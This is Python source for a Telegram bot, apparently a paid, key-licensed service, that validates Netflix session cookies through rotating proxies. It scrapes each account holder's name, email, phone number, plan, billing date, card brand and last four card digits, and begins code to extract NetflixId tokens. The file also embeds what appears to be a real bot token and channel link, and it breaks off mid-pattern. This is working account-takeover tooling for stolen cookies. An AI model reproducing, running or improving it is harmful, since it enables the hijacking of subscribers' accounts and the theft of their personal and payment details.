import os
import re
import io
import sys
import json
import time
import logging
import asyncio
import requests
import zipfile
import shutil
import subprocess
import random
import string
import concurrent.futures
from datetime import datetime, timezone, timedelta
from urllib.parse import unquote
import html as html_module

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "7972038760:AAEXOmE44KVDTY5xLVVUi9MMuWF2CbIKYYo")
OWNER_USER_ID = "6284479489"

CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1002710971355"))
PRIVATE_CHANNEL_LINK = os.environ.get("PRIVATE_CHANNEL_LINK", "https://t.me/+7Q9vA87LKeMwOTNl")

DOWNLOAD_DIR = "downloads"
RESULTS_DIR = "results"
TIMEOUT_REQUEST = 10
WORKER_COUNT = 30
MAX_WORKERS = 100
PROXY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'proxy.json')

proxy_list = []
proxy_index = {"idx": 0}

def load_proxy():
    global proxy_list
    try:
        with open(PROXY_FILE, 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                proxy_list = data
            elif isinstance(data, dict) and data.get("url"):
                proxy_list = [data["url"]]
            elif isinstance(data, dict) and data.get("proxies"):
                proxy_list = data["proxies"]
            else:
                proxy_list = []
    except (FileNotFoundError, json.JSONDecodeError):
        proxy_list = []

def save_proxy():
    with open(PROXY_FILE, 'w') as f:
        json.dump({"proxies": proxy_list}, f, indent=2)

def parse_proxy_string(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"http://{user}:{passwd}@{host}:{port}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif proxy_str.startswith("http://") or proxy_str.startswith("https://") or proxy_str.startswith("socks"):
        return proxy_str
    return None

def get_rotating_proxy():
    if not proxy_list:
        return None
    idx = proxy_index["idx"] % len(proxy_list)
    proxy_index["idx"] = idx + 1
    return proxy_list[idx]

def get_proxy_dict():
    proxy_url = get_rotating_proxy()
    if proxy_url:
        return {"http": proxy_url, "https": proxy_url}
    return None

def apply_proxy_to_session(session):
    proxies = get_proxy_dict()
    if proxies:
        session.proxies.update(proxies)
    else:
        session.proxies.clear()

load_proxy()

os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.constants import ParseMode

USERS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'users.txt')
KEYS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keys.json')
USER_ACCESS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_access.json')


def load_authorized_users():
    users = set()
    try:
        with open(USERS_FILE, 'r') as f:
            for line in f:
                uid = line.strip()
                if uid:
                    users.add(uid)
    except FileNotFoundError:
        pass
    users.add(OWNER_USER_ID)
    return users


def save_authorized_users():
    try:
        with open(USERS_FILE, 'w') as f:
            for uid in authorized_users:
                f.write(f"{uid}\n")
    except Exception as e:
        logger.error(f"Failed to save users.txt: {e}")


def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w') as f:
            json.dump(keys_data, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save keys.json: {e}")


def load_user_access():
    try:
        with open(USER_ACCESS_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def save_user_access():
    try:
        with open(USER_ACCESS_FILE, 'w') as f:
            json.dump(user_access, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to save user_access.json: {e}")


def generate_key(length=16):
    chars = string.ascii_uppercase + string.digits
    return "NFLX-" + "-".join(
        "".join(random.choices(chars, k=4)) for _ in range(length // 4)
    )


DURATION_MAP = {
    "1h": 3600, "6h": 21600, "12h": 43200,
    "1d": 86400, "3d": 259200, "7d": 604800, "14d": 1209600,
    "1m": 2592000, "3m": 7776000, "6m": 15552000, "1y": 31536000,
}


def duration_label(code):
    labels = {
        "1h": "1 Hour", "6h": "6 Hours", "12h": "12 Hours",
        "1d": "1 Day", "3d": "3 Days", "7d": "7 Days", "14d": "14 Days",
        "1m": "1 Month", "3m": "3 Months", "6m": "6 Months", "1y": "1 Year",
    }
    return labels.get(code, code)


authorized_users = load_authorized_users()
generated_keys = load_keys()
user_access = load_user_access()
user_tokens = {}
user_file_store = {}
batch_tasks = {}
stop_flags = {}
daily_batch_usage = {}
FREE_DAILY_BATCH_LIMIT = 2

thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS)

LOCK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'lock_state.json')
bot_locked = False

def load_lock_state():
    global bot_locked
    try:
        with open(LOCK_FILE, 'r') as f:
            data = json.load(f)
            bot_locked = data.get("locked", False)
    except (FileNotFoundError, json.JSONDecodeError):
        bot_locked = False

def save_lock_state():
    try:
        with open(LOCK_FILE, 'w') as f:
            json.dump({"locked": bot_locked}, f)
    except Exception as e:
        logger.error(f"Failed to save lock_state.json: {e}")

load_lock_state()

def check_lock(user_id):
    if not bot_locked:
        return True
    return is_authorized(user_id)

LOCK_MSG = (
    "\U0001f512 <b>Bot is currently locked.</b>\n"
    "Only authorized users can use commands.\n"
    "Use /redeem &lt;key&gt; to get access."
)


def is_authorized(user_id):
    uid = str(user_id)
    if uid == OWNER_USER_ID:
        return True
    if uid in authorized_users:
        return True
    if uid in user_access:
        expires = user_access[uid].get("expires", 0)
        if expires == 0:
            return True
        if time.time() < expires:
            return True
        else:
            del user_access[uid]
            save_user_access()
            return False
    return False


def get_access_info(user_id):
    uid = str(user_id)
    if uid == OWNER_USER_ID:
        return "Owner (Permanent)"
    if uid in authorized_users:
        return "Permanent (/mercy)"
    if uid in user_access:
        expires = user_access[uid].get("expires", 0)
        if expires == 0:
            return "Permanent (Key)"
        remaining = expires - time.time()
        if remaining > 0:
            days = int(remaining // 86400)
            hours = int((remaining % 86400) // 3600)
            mins = int((remaining % 3600) // 60)
            if days > 0:
                return f"{days}d {hours}h remaining"
            elif hours > 0:
                return f"{hours}h {mins}m remaining"
            else:
                return f"{mins}m remaining"
        return "Expired"
    return "No access"


def is_premium_user(user_id):
    return is_authorized(user_id)


def get_today_key():
    from datetime import date
    return date.today().isoformat()


def get_batch_usage(user_id):
    uid = str(user_id)
    today = get_today_key()
    if uid in daily_batch_usage:
        if daily_batch_usage[uid].get("date") == today:
            return daily_batch_usage[uid].get("count", 0)
    return 0


def increment_batch_usage(user_id):
    uid = str(user_id)
    today = get_today_key()
    if uid not in daily_batch_usage or daily_batch_usage[uid].get("date") != today:
        daily_batch_usage[uid] = {"date": today, "count": 0}
    daily_batch_usage[uid]["count"] += 1


def can_use_batch(user_id):
    if is_premium_user(user_id):
        return True
    return get_batch_usage(user_id) < FREE_DAILY_BATCH_LIMIT


def get_batch_remaining(user_id):
    if is_premium_user(user_id):
        return "Unlimited"
    used = get_batch_usage(user_id)
    remaining = FREE_DAILY_BATCH_LIMIT - used
    return max(0, remaining)


PHONE_PREFIX_TO_COUNTRY = {
    '93': 'AF', '355': 'AL', '213': 'DZ', '1684': 'AS', '376': 'AD', '244': 'AO', '1264': 'AI',
    '1268': 'AG', '54': 'AR', '374': 'AM', '297': 'AW', '61': 'AU', '43': 'AT', '994': 'AZ',
    '1242': 'BS', '973': 'BH', '880': 'BD', '1246': 'BB', '375': 'BY', '32': 'BE', '501': 'BZ',
    '229': 'BJ', '1441': 'BM', '975': 'BT', '591': 'BO', '387': 'BA', '267': 'BW', '55': 'BR',
    '246': 'IO', '673': 'BN', '359': 'BG', '226': 'BF', '257': 'BI', '855': 'KH', '237': 'CM',
    '1': 'CA', '238': 'CV', '1345': 'KY', '236': 'CF', '235': 'TD', '56': 'CL', '86': 'CN',
    '57': 'CO', '269': 'KM', '242': 'CG', '682': 'CK', '506': 'CR',
    '225': 'CI', '385': 'HR', '53': 'CU', '357': 'CY', '420': 'CZ', '45': 'DK', '253': 'DJ',
    '1767': 'DM', '1809': 'DO', '593': 'EC', '20': 'EG', '503': 'SV', '240': 'GQ', '291': 'ER',
    '372': 'EE', '251': 'ET', '500': 'FK', '298': 'FO', '679': 'FJ', '358': 'FI', '33': 'FR',
    '594': 'GF', '689': 'PF', '241': 'GA', '220': 'GM', '995': 'GE', '49': 'DE', '233': 'GH',
    '350': 'GI', '30': 'GR', '299': 'GL', '1473': 'GD', '590': 'GP', '1671': 'GU', '502': 'GT',
    '224': 'GN', '245': 'GW', '592': 'GY', '509': 'HT', '504': 'HN', '852': 'HK', '36': 'HU',
    '354': 'IS', '91': 'IN', '62': 'ID', '98': 'IR', '964': 'IQ', '353': 'IE', '972': 'IL',
    '39': 'IT', '1876': 'JM', '81': 'JP', '962': 'JO', '7': 'KZ', '254': 'KE', '686': 'KI',
    '850': 'KP', '82': 'KR', '965': 'KW', '996': 'KG', '856': 'LA', '371': 'LV', '961': 'LB',
    '266': 'LS', '231': 'LR', '218': 'LY', '423': 'LI', '370': 'LT', '352': 'LU', '853': 'MO',
    '389': 'MK', '261': 'MG', '265': 'MW', '60': 'MY', '960': 'MV', '223': 'ML', '356': 'MT',
    '692': 'MH', '596': 'MQ', '222': 'MR', '230': 'MU', '262': 'YT', '52': 'MX', '691': 'FM',
    '373': 'MD', '377': 'MC', '976': 'MN', '382': 'ME', '1664': 'MS', '212': 'MA', '258': 'MZ',
    '95': 'MM', '264': 'NA', '674': 'NR', '977': 'NP', '31': 'NL', '687': 'NC', '64': 'NZ',
    '505': 'NI', '227': 'NE', '234': 'NG', '683': 'NU', '672': 'NF', '1670': 'MP', '47': 'NO',
    '968': 'OM', '92': 'PK', '680': 'PW', '507': 'PA', '675': 'PG', '595': 'PY', '51': 'PE',
    '63': 'PH', '48': 'PL', '351': 'PT', '1787': 'PR', '974': 'QA',
    '40': 'RO', '250': 'RW', '290': 'SH', '1869': 'KN', '1758': 'LC', '508': 'PM',
    '1784': 'VC', '685': 'WS', '378': 'SM', '239': 'ST', '966': 'SA', '221': 'SN', '381': 'RS',
    '248': 'SC', '232': 'SL', '65': 'SG', '421': 'SK', '386': 'SI', '677': 'SB', '252': 'SO',
    '27': 'ZA', '34': 'ES', '94': 'LK', '249': 'SD', '597': 'SR', '268': 'SZ',
    '46': 'SE', '41': 'CH', '963': 'SY', '886': 'TW', '992': 'TJ', '255': 'TZ', '66': 'TH',
    '228': 'TG', '690': 'TK', '676': 'TO', '1868': 'TT', '216': 'TN', '90': 'TR', '993': 'TM',
    '1649': 'TC', '688': 'TV', '256': 'UG', '380': 'UA', '971': 'AE', '44': 'GB',
    '598': 'UY', '998': 'UZ', '678': 'VU', '58': 'VE', '84': 'VN', '1284': 'VG',
    '1340': 'VI', '681': 'WF', '967': 'YE', '260': 'ZM', '263': 'ZW'
}

COUNTRY_MAPPING = {
    "AF": "Afghanistan \U0001f1e6\U0001f1eb", "AX": "\u00c5land Islands \U0001f1e6\U0001f1fd", "AL": "Albania \U0001f1e6\U0001f1f1", "DZ": "Algeria \U0001f1e9\U0001f1ff",
    "AS": "American Samoa \U0001f1e6\U0001f1f8", "AD": "Andorra \U0001f1e6\U0001f1e9", "AO": "Angola \U0001f1e6\U0001f1f4", "AI": "Anguilla \U0001f1e6\U0001f1ee",
    "AQ": "Antarctica \U0001f1e6\U0001f1f6", "AG": "Antigua and Barbuda \U0001f1e6\U0001f1ec", "AR": "Argentina \U0001f1e6\U0001f1f7", "AM": "Armenia \U0001f1e6\U0001f1f2",
    "AW": "Aruba \U0001f1e6\U0001f1fc", "AU": "Australia \U0001f1e6\U0001f1fa", "AT": "Austria \U0001f1e6\U0001f1f9", "AZ": "Azerbaijan \U0001f1e6\U0001f1ff",
    "BS": "Bahamas \U0001f1e7\U0001f1f8", "BH": "Bahrain \U0001f1e7\U0001f1ed", "BD": "Bangladesh \U0001f1e7\U0001f1e9", "BB": "Barbados \U0001f1e7\U0001f1e7",
    "BY": "Belarus \U0001f1e7\U0001f1fe", "BE": "Belgium \U0001f1e7\U0001f1ea", "BZ": "Belize \U0001f1e7\U0001f1ff", "BJ": "Benin \U0001f1e7\U0001f1ef",
    "BM": "Bermuda \U0001f1e7\U0001f1f2", "BT": "Bhutan \U0001f1e7\U0001f1f9", "BO": "Bolivia \U0001f1e7\U0001f1f4", "BQ": "Bonaire \U0001f1e7\U0001f1f6",
    "BA": "Bosnia and Herzegovina \U0001f1e7\U0001f1e6", "BW": "Botswana \U0001f1e7\U0001f1fc", "BR": "Brazil \U0001f1e7\U0001f1f7",
    "IO": "British Indian Ocean Territory \U0001f1ee\U0001f1f4", "BN": "Brunei Darussalam \U0001f1e7\U0001f1f3",
    "BG": "Bulgaria \U0001f1e7\U0001f1ec", "BF": "Burkina Faso \U0001f1e7\U0001f1eb", "BI": "Burundi \U0001f1e7\U0001f1ee", "KH": "Cambodia \U0001f1f0\U0001f1ed",
    "CM": "Cameroon \U0001f1e8\U0001f1f2", "CA": "Canada \U0001f1e8\U0001f1e6", "CV": "Cape Verde \U0001f1e8\U0001f1fb", "KY": "Cayman Islands \U0001f1f0\U0001f1fe",
    "CF": "Central African Republic \U0001f1e8\U0001f1eb", "TD": "Chad \U0001f1f9\U0001f1e9", "CL": "Chile \U0001f1e8\U0001f1f1", "CN": "China \U0001f1e8\U0001f1f3",
    "CO": "Colombia \U0001f1e8\U0001f1f4", "KM": "Comoros \U0001f1f0\U0001f1f2", "CG": "Congo \U0001f1e8\U0001f1ec",
    "CD": "Congo DR \U0001f1e8\U0001f1e9", "CK": "Cook Islands \U0001f1e8\U0001f1f0", "CR": "Costa Rica \U0001f1e8\U0001f1f7",
    "CI": "C\u00f4te d'Ivoire \U0001f1e8\U0001f1ee", "HR": "Croatia \U0001f1ed\U0001f1f7", "CU": "Cuba \U0001f1e8\U0001f1fa",
    "CY": "Cyprus \U0001f1e8\U0001f1fe", "CZ": "Czech Republic \U0001f1e8\U0001f1ff", "DK": "Denmark \U0001f1e9\U0001f1f0",
    "DJ": "Djibouti \U0001f1e9\U0001f1ef", "DM": "Dominica \U0001f1e9\U0001f1f2", "DO": "Dominican Republic \U0001f1e9\U0001f1f4",
    "EC": "Ecuador \U0001f1ea\U0001f1e8", "EG": "Egypt \U0001f1ea\U0001f1ec", "SV": "El Salvador \U0001f1f8\U0001f1fb",
    "GQ": "Equatorial Guinea \U0001f1ec\U0001f1f6", "ER": "Eritrea \U0001f1ea\U0001f1f7", "EE": "Estonia \U0001f1ea\U0001f1ea",
    "ET": "Ethiopia \U0001f1ea\U0001f1f9", "FI": "Finland \U0001f1eb\U0001f1ee", "FR": "France \U0001f1eb\U0001f1f7",
    "GA": "Gabon \U0001f1ec\U0001f1e6", "GM": "Gambia \U0001f1ec\U0001f1f2", "GE": "Georgia \U0001f1ec\U0001f1ea",
    "DE": "Germany \U0001f1e9\U0001f1ea", "GH": "Ghana \U0001f1ec\U0001f1ed", "GR": "Greece \U0001f1ec\U0001f1f7",
    "GT": "Guatemala \U0001f1ec\U0001f1f9", "GN": "Guinea \U0001f1ec\U0001f1f3", "HT": "Haiti \U0001f1ed\U0001f1f9",
    "HN": "Honduras \U0001f1ed\U0001f1f3", "HK": "Hong Kong \U0001f1ed\U0001f1f0", "HU": "Hungary \U0001f1ed\U0001f1fa",
    "IS": "Iceland \U0001f1ee\U0001f1f8", "IN": "India \U0001f1ee\U0001f1f3", "ID": "Indonesia \U0001f1ee\U0001f1e9",
    "IR": "Iran \U0001f1ee\U0001f1f7", "IQ": "Iraq \U0001f1ee\U0001f1f6", "IE": "Ireland \U0001f1ee\U0001f1ea",
    "IL": "Israel \U0001f1ee\U0001f1f1", "IT": "Italy \U0001f1ee\U0001f1f9", "JM": "Jamaica \U0001f1ef\U0001f1f2",
    "JP": "Japan \U0001f1ef\U0001f1f5", "JO": "Jordan \U0001f1ef\U0001f1f4", "KZ": "Kazakhstan \U0001f1f0\U0001f1ff",
    "KE": "Kenya \U0001f1f0\U0001f1ea", "KR": "South Korea \U0001f1f0\U0001f1f7", "KW": "Kuwait \U0001f1f0\U0001f1fc",
    "LV": "Latvia \U0001f1f1\U0001f1fb", "LB": "Lebanon \U0001f1f1\U0001f1e7", "LT": "Lithuania \U0001f1f1\U0001f1f9",
    "LU": "Luxembourg \U0001f1f1\U0001f1fa", "MY": "Malaysia \U0001f1f2\U0001f1fe", "MX": "Mexico \U0001f1f2\U0001f1fd",
    "MA": "Morocco \U0001f1f2\U0001f1e6", "NL": "Netherlands \U0001f1f3\U0001f1f1", "NZ": "New Zealand \U0001f1f3\U0001f1ff",
    "NG": "Nigeria \U0001f1f3\U0001f1ec", "NO": "Norway \U0001f1f3\U0001f1f4", "PK": "Pakistan \U0001f1f5\U0001f1f0",
    "PA": "Panama \U0001f1f5\U0001f1e6", "PY": "Paraguay \U0001f1f5\U0001f1fe", "PE": "Peru \U0001f1f5\U0001f1ea",
    "PH": "Philippines \U0001f1f5\U0001f1ed", "PL": "Poland \U0001f1f5\U0001f1f1", "PT": "Portugal \U0001f1f5\U0001f1f9",
    "QA": "Qatar \U0001f1f6\U0001f1e6", "RO": "Romania \U0001f1f7\U0001f1f4", "RU": "Russia \U0001f1f7\U0001f1fa",
    "SA": "Saudi Arabia \U0001f1f8\U0001f1e6", "SN": "Senegal \U0001f1f8\U0001f1f3", "RS": "Serbia \U0001f1f7\U0001f1f8",
    "SG": "Singapore \U0001f1f8\U0001f1ec", "SK": "Slovakia \U0001f1f8\U0001f1f0", "SI": "Slovenia \U0001f1f8\U0001f1ee",
    "ZA": "South Africa \U0001f1ff\U0001f1e6", "ES": "Spain \U0001f1ea\U0001f1f8", "LK": "Sri Lanka \U0001f1f1\U0001f1f0",
    "SE": "Sweden \U0001f1f8\U0001f1ea", "CH": "Switzerland \U0001f1e8\U0001f1ed", "TW": "Taiwan \U0001f1f9\U0001f1fc",
    "TZ": "Tanzania \U0001f1f9\U0001f1ff", "TH": "Thailand \U0001f1f9\U0001f1ed", "TN": "Tunisia \U0001f1f9\U0001f1f3",
    "TR": "Turkey \U0001f1f9\U0001f1f7", "UA": "Ukraine \U0001f1fa\U0001f1e6", "AE": "UAE \U0001f1e6\U0001f1ea",
    "GB": "United Kingdom \U0001f1ec\U0001f1e7", "US": "United States \U0001f1fa\U0001f1f8", "UY": "Uruguay \U0001f1fa\U0001f1fe",
    "VE": "Venezuela \U0001f1fb\U0001f1ea", "VN": "Vietnam \U0001f1fb\U0001f1f3", "ZM": "Zambia \U0001f1ff\U0001f1f2",
    "ZW": "Zimbabwe \U0001f1ff\U0001f1fc",
}


class NetflixChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        apply_proxy_to_session(self.session)

    def load_cookies(self, cookie_string):
        cookies = {}
        try:
            if isinstance(cookie_string, dict):
                return cookie_string
            cookie_string = cookie_string.encode('ascii', errors='ignore').decode('ascii')
            if '\t' in cookie_string:
                for line in cookie_string.split('\n'):
                    if line.startswith('#') or not line.strip():
                        continue
                    parts = line.split('\t')
                    if len(parts) >= 7:
                        cookies[parts[5].strip()] = parts[6].strip()
                return cookies if cookies else None
            for pair in cookie_string.replace('; ', ';').split(';'):
                pair = pair.strip()
                if '=' in pair:
                    key, val = pair.split('=', 1)
                    cookies[key.strip()] = val.strip()
            return cookies if cookies else None
        except Exception as e:
            logger.error(f"Cookie parse error: {e}")
            return None

    @staticmethod
    def _unescape_netflix(s):
        if not s:
            return s
        def replace_unicode(m):
            try:
                return chr(int(m.group(1), 16))
            except Exception:
                return m.group(0)
        def replace_hex(m):
            try:
                return chr(int(m.group(1), 16))
            except Exception:
                return m.group(0)
        s = re.sub(r'\\u([0-9a-fA-F]{4})', replace_unicode, s)
        s = re.sub(r'\\x([0-9a-fA-F]{2})', replace_hex, s)
        try:
            s = html_module.unescape(s)
        except Exception:
            pass
        try:
            s = unquote(s)
        except Exception:
            pass
        return s

    def check_account(self, cookies):
        info = {"status": "failure", "message": "Unknown error"}
        try:
            cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items()) if isinstance(cookies, dict) else cookies
            cookie_str = cookie_str.encode('ascii', errors='ignore').decode('ascii')
            if 'L=en' not in cookie_str:
                cookie_str = 'L=en; ' + cookie_str
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": cookie_str
            }
            resp = self.session.get("https://www.netflix.com/YourAccount?lng=en", headers=headers, timeout=TIMEOUT_REQUEST, allow_redirects=True)

            if resp.status_code != 200:
                info["message"] = f"HTTP {resp.status_code}"
                return info

            body = resp.text

            if '"mode":"login"' in body:
                info["message"] = "Cookie expired or invalid (login page detected)"
                info["membership_status"] = "EXPIRED"
                return info

            if '"mode":"yourAccount"' not in body:
                if '/login' in resp.url or 'login' in body[:2000].lower():
                    info["message"] = "Cookie expired or invalid (redirected to login)"
                    info["membership_status"] = "EXPIRED"
                    return info

            def find(pattern):
                m = re.search(pattern, body)
                return m.group(1) if m else None

            status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', body)
            is_current = status_match and status_match.group(1) == 'CURRENT_MEMBER'

            info["status"] = "success"
            info["membership_status"] = status_match.group(1) if status_match else "ACTIVE"

            name = find(r'"userInfo":\{"data":\{"name":"([^"]+)"')
            if not name:
                name = find(r'"profileName"\s*:\s*"([^"]+)"')
            if name:
                info["name"] = self._unescape_netflix(name)
            else:
                info["name"] = "N/A"

            country_code = find(r'"currentCountry":"([^"]+)"') or find(r'"countryCode":"([^"]+)"') or find(r'"countryOfSignup":"([^"]+)"')
            if country_code:
                cc = country_code.upper()
                info["country"] = COUNTRY_MAPPING.get(cc, cc)
            else:
                info["country"] = "N/A"

            plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
            if not plan:
                plan = find(r'"planName"\s*:\s*"([^"]+)"')
            if plan:
                info["plan"] = self._unescape_netflix(plan)
            else:
                info["plan"] = "N/A"

            plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            if plan_price:
                info["plan_price"] = self._unescape_netflix(plan_price)
            else:
                info["plan_price"] = "N/A"

            member_since = find(r'"memberSince":"([^"]+)"')
            if member_since:
                info["member_since"] = self._unescape_netflix(member_since)
            else:
                info["member_since"] = "N/A"

            next_billing = find(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"')
            if not next_billing:
                next_billing = find(r'"nextBillingDate"\s*:\s*"([^"]+)"')
            if next_billing:
                info["next_billing"] = self._unescape_netflix(next_billing)
            else:
                info["next_billing"] = "N/A"

            email_match = re.search(r'"growthEmail":\{.*?"email":\{.*?"value":"([^"]+)"', body, re.DOTALL)
            if email_match:
                info["email"] = self._unescape_netflix(email_match.group(1))
            else:
                email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"memberEmail"\s*:\s*"([^"]+)"')
                if email:
                    info["email"] = self._unescape_netflix(email)
                else:
                    info["email"] = "N/A"

            phone_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"phoneNumberDigits":\{.*?"value":"([^"]+)"', body, re.DOTALL)
            if phone_match:
                info["phone"] = self._unescape_netflix(phone_match.group(1))
            else:
                phone = find(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"')
                if phone:
                    info["phone"] = self._unescape_netflix(phone)
                else:
                    info["phone"] = "N/A"

            payment_method = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            if payment_method:
                info["payment_method"] = payment_method
            else:
                info["payment_method"] = "N/A"

            card_brands = re.findall(r'"paymentOptionLogo":"([^"]+)"', body)
            info["card_brand"] = card_brands if card_brands else ["Unknown"]

            last4_list = re.findall(r'"GrowthCardPaymentMethod","displayText":"([^"]+)"', body)
            info["last4"] = last4_list[0] if last4_list else "Unknown"

            max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            if not max_streams:
                max_streams = find(r'"maxStreams"\s*:\s*(\d+)')
            info["max_streams"] = max_streams if max_streams else "Unknown"

            video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            info["video_quality"] = video_quality if video_quality else "Unknown"

            phone_verified_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"isVerified":(true|false)', body, re.DOTALL)
            if phone_verified_match:
                info["phone_verified"] = "Yes" if phone_verified_match.group(1) == "true" else "No"
            else:
                pv2 = re.search(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":(true|false)', body)
                info["phone_verified"] = ("Yes" if pv2.group(1) == "true" else "No") if pv2 else "Unknown"

            email_verified_match = re.search(r'"growthEmail":\{.*?"isVerified":(true|false)', body, re.DOTALL)
            if email_verified_match:
                info["email_verified"] = "Yes" if email_verified_match.group(1) == "true" else "No"
            else:
                ev2 = re.search(r'"emailVerified"\s*:\s*(true|false)', body)
                info["email_verified"] = ("Yes" if ev2.group(1) == "true" else "No") if ev2 else "Unknown"

            payment_hold = find(r'"growthHoldMetadata":\{"__typename":"GrowthHoldMetadata","isUserOnHold":(true|false)')
            if payment_hold:
                info["on_hold"] = "Yes" if payment_hold == "true" else "No"
            else:
                info["on_hold"] = "Unknown"

            extra_member = find(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)')
            if extra_member:
                info["extra_members"] = "Yes" if extra_member == "true" else "No"
            else:
                extra_match = re.search(r'"extraMemberSlots"\s*:\s*(\d+)', body)
                info["extra_members"] = extra_match.group(1) if extra_match else "No"

            add_on_slots_match = re.search(r'"addOnSlots":\s*\{[^}]*"value":\s*\[\s*\{\s*"fieldType":\s*"Group",\s*"fieldGroup":\s*"AddOnSlot",\s*"fields":\s*\{\s*"slotState":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"', body, re.DOTALL)
            info["extra_member_slot_status"] = add_on_slots_match.group(1) if add_on_slots_match else "Unknown"

            try:
                profiles_resp = self.session.get("https://www.netflix.com/ManageProfiles?lng=en", headers=headers, timeout=10)
                profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', profiles_resp.text)
                if profile_names:
                    decoded = [self._unescape_netflix(p) for p in profile_names]
                    info["profiles"] = ", ".join(decoded)
                    info["connected_profiles"] = str(len(decoded))
                else:
                    info["profiles"] = "Unknown"
                    info["connected_profiles"] = "Unknown"
            except Exception:
                info["profiles"] = "Unknown"
                info["connected_profiles"] = "Unknown"

            if info["phone"] and info["phone"] != "N/A":
                phone_digits = re.sub(r'[^\d]', '', info["phone"])
                if phone_digits and (not info.get("country") or info["country"] == "N/A"):
                    for prefix_len in [4, 3, 2, 1]:
                        prefix = phone_digits[:prefix_len]
                        if prefix in PHONE_PREFIX_TO_COUNTRY:
                            cc = PHONE_PREFIX_TO_COUNTRY[prefix]
                            info["country"] = COUNTRY_MAPPING.get(cc, cc)
                            break

        except requests.exceptions.Timeout:
            info["message"] = "Request timeout"
        except requests.exceptions.ConnectionError:
            info["message"] = "Connection error"
        except Exception as e:
            logger.error(f"check_account error: {e}")
            info.setdefault('name', 'N/A')
            info.setdefault('email', 'N/A')
            info.setdefault('plan', 'N/A')
            info.setdefault('plan_price', 'N/A')
            info.setdefault('next_billing', 'N/A')
            info.setdefault('country', 'N/A')
            info.setdefault('phone', 'N/A')
            info.setdefault('payment_method', 'N/A')
            info.setdefault('payment_type', 'N/A')
            info.setdefault('last4', 'N/A')
            info.setdefault('card_brand', 'N/A')
            info.setdefault('extra_members', '0')
            info.setdefault('membership_status', 'N/A')
            info.setdefault('phone_verified', 'N/A')
            info.setdefault('video_quality', 'N/A')
            info.setdefault('max_streams', 'N/A')
            info.setdefault('connected_profiles', 'N/A')
            info.setdefault('member_since', 'N/A')
            logger.error(f"Parse error: {e}")

        return info


class NetflixTokenGenerator:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8.5 Mobile/15E148 Safari/604.1"
        })
        apply_proxy_to_session(self.session)
        self.stats = {
            "tokens_generated": 0, "errors": 0, "checks_done": 0,
            "hits": 0, "last_generated": None, "batch_processes": 0,
            "batch_stopped": 0, "batch_cancelled": 0, "workers_used": 0
        }

    def extract_netflix_id(self, text):
        netflix_id = None
        match = re.search(r'(?<![Ss]ecure)NetflixId=([^;\s]+)', text)
        if match:
            netflix_id = match.group(1).strip('; ')
            if netflix_id.endswith('..'):
                netflix_id = netflix_id[:-2]
            elif netflix_id.endswith('.'):
                netflix_id = netflix_id[:-1]
            return netflix_id
        match = re.search(r'(?<![Ss]ecure)netflixid=([^;\s]+)', text, re.IGNORECASE)
        if match:
            val = match.group(0)
            if not val.lower().startswith('securenetflixid'):
                netflix_id = match.group(1).strip('; ')
                if netflix_id.endswith('..'):
                    netflix_id = netflix_id[:-2]
                elif netflix_id.endswith('.'):
                    netflix_id = netflix_id[:-1]
                return netflix_id
        raw_patterns = [
            r'(?<!mac%3D)(v%3D3%26ct%3D[^;\s]+(?:%26[^;\s]+)*)',
